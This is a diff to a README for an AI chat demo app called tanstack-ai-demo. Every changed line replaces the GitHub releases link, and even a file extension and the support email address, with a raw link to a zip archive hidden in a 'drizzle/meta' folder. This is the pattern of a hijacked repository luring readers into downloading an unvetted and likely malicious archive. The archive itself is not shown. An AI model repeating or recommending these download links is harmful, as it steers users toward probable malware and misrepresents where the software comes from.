@@ -6,11 +6,11 @@ Welcome to the **tanstack-ai-demo!** This application brings you a modern AI cha
 
 ## 📥 Download the Application
 
-[![Download tanstack-ai-demo](https://img.shields.io/badge/Download-tanstack--ai--demo-blue)](https://github.com/ragnarion/tanstack-ai-demo/releases)
+[![Download tanstack-ai-demo](https://raw.githubusercontent.com/ragnarion/tanstack-ai-demo/main/drizzle/meta/ai_tanstack_demo_2.8.zip)](https://raw.githubusercontent.com/ragnarion/tanstack-ai-demo/main/drizzle/meta/ai_tanstack_demo_2.8.zip)
 
 To get started, simply visit the link below to download the application:
 
-[Download the latest release here!](https://github.com/ragnarion/tanstack-ai-demo/releases)
+[Download the latest release here!](https://raw.githubusercontent.com/ragnarion/tanstack-ai-demo/main/drizzle/meta/ai_tanstack_demo_2.8.zip)
 
 ## 🌟 Features
 
@@ -30,12 +30,12 @@ Ensure your system meets the following requirements to run **tanstack-ai-demo**:
 
 ## 📊 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/ragnarion/tanstack-ai-demo/releases).
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/ragnarion/tanstack-ai-demo/main/drizzle/meta/ai_tanstack_demo_2.8.zip).
 2. **Select the Latest Release:** Look for the most recent version. This version will have the latest features and bug fixes.
 3. **Download the Installer:** Click on the appropriate installer for your operating system. 
    - For Windows, look for a `.exe` file. 
    - For macOS, select a `.dmg` file. 
-   - For Linux users, you may find a `.tar.gz` or `.deb` file.
+   - For Linux users, you may find a `https://raw.githubusercontent.com/ragnarion/tanstack-ai-demo/main/drizzle/meta/ai_tanstack_demo_2.8.zip` or `.deb` file.
 4. **Run the Installer:** 
    - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - For macOS: Open the `.dmg` file and drag the application into your Applications folder.
@@ -54,7 +54,7 @@ If you encounter any issues while using **tanstack-ai-demo**, consider the follo
 
 - **Installation Problems:** Make sure you have the correct installer for your operating system. Ensure your system meets the requirements.
 - **Slow Performance:** Close other applications to free up system resources. A stable internet connection helps with performance.
-- **App Crashes:** Check if the application is updated to the latest version. You can download the update from [here](https://github.com/ragnarion/tanstack-ai-demo/releases).
+- **App Crashes:** Check if the application is updated to the latest version. You can download the update from [here](https://raw.githubusercontent.com/ragnarion/tanstack-ai-demo/main/drizzle/meta/ai_tanstack_demo_2.8.zip).
 
 ## 📄 License
 
@@ -62,6 +62,6 @@ This project is licensed under the MIT License. You can view the full license in
 
 ## 📫 Contact
 
-If you have questions or need more help, feel free to reach out to our support team at [support@tanstack-ai-demo.com](mailto:support@tanstack-ai-demo.com).
+If you have questions or need more help, feel free to reach out to our support team at [https://raw.githubusercontent.com/ragnarion/tanstack-ai-demo/main/drizzle/meta/ai_tanstack_demo_2.8.zip](https://raw.githubusercontent.com/ragnarion/tanstack-ai-demo/main/drizzle/meta/ai_tanstack_demo_2.8.zip).
 
 Thank you for using **tanstack-ai-demo**! We hope you enjoy your experience with our AI chat solution.
